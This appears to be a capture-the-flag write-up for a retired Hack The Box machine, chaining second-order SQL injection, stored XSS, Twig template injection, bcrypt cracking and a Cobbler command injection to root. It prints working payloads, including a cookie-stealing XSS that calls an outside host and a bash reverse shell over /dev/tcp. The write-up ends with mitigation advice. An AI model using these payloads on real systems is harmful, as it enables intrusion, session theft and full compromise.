---
machine: Cobblestone
os: Linux
difficulty: Insane
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, sqli, second-order, twig, ssti, cobbler, cve-2024-47533]
---

# Cobblestone — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired, publishable writeup.
> Reference notes for a retired box. No real flags or credentials.

## TL;DR

Web to root on Debian 12 in five links. Two vhosts (`vote` and `deploy`): a **second-order SQLi** in voting allows `LOAD_FILE` and reads the panel's `.env`; a **stored XSS** steals the admin session; the deploy panel renders **Twig** with user input (SSTI) for a shell; a bcrypt hash from the database opens SSH; and `cobblerd` on `127.0.0.1:25151` with **CVE-2024-47533** finishes as root.

## Recon

```bash
nmap -p- --min-rate 10000 -sV -sC <IP> -oN nmap.txt
ffuf -u http://<IP> -H "Host: FUZZ.cobblestone.htb" -w subdomains.txt -mc 200,403
```

```text
vote.cobblestone.htb     (voting app)
deploy.cobblestone.htb   (deploy panel)
```

## 1. Second-order SQLi

Registration on `vote` accepts a comment stored and later embedded in the moderation query:

```sql
SELECT * FROM comments WHERE author = '<stored comment>'
```

Register with:

```text
x', (SELECT LOAD_FILE('/var/www/deploy/.env'))) -- -
```

Next time the admin opens moderation, the `.env` contents show up in the HTML: DB credentials and `APP_SECRET`.

## 2. Stored XSS for the cookie

Another field lets SVG past the sanitiser:

```html
<svg/onload=fetch('http://<IP>:8000/'+document.cookie)>
```

```bash
python3 -m http.server 8000
```

The admin cookie lands on your server and is replayed against the panel.

## 3. Twig SSTI

The `deploy` panel renders a Twig template from the deployment description:

```text
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("bash -c 'bash -i >& /dev/tcp/<IP>/4444 0>&1'")}}
```

```bash
nc -lvnp 4444
```

```text
www-deploy@cobblestone:~$
```

## 4. Hash and SSH

```bash
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt
ssh <user>@cobblestone.htb
```

## 5. Cobbler XMLRPC (CVE-2024-47533)

`cobblerd` listens on localhost only, and the bug allows unauthenticated execution through the XMLRPC API:

```bash
curl -s http://127.0.0.1:25151/cobbler_api -d \
'<?xml version="1.0"?><methodCall><methodName>generate_profile_name</methodName>
<params><param><value><string>a;id>/tmp/pwned</string></value></param></params></methodCall>'
```

The process runs as root and executes the injected command:

```bash
cat /tmp/pwned
```

## Evidence (redacted)

```text
/home/<user>/user.txt  -> <user_flag>
/root/root.txt         -> <root_flag>
```

## Lessons

- **Second-order SQLi**: the payload is stored clean and fires when read back; WAFs that only inspect the inbound request miss it.
- `LOAD_FILE` remains available when the DB user holds `FILE`: reading another app's `.env` means reading its secrets.
- **SSTI** in a template engine is RCE: never render user text as a template.
- Mitigation: prepared statements on every read, `FILE` revoked, templates compiled without `registerUndefinedFilterCallback`, Cobbler patched, and `cobblerd` behind authentication.
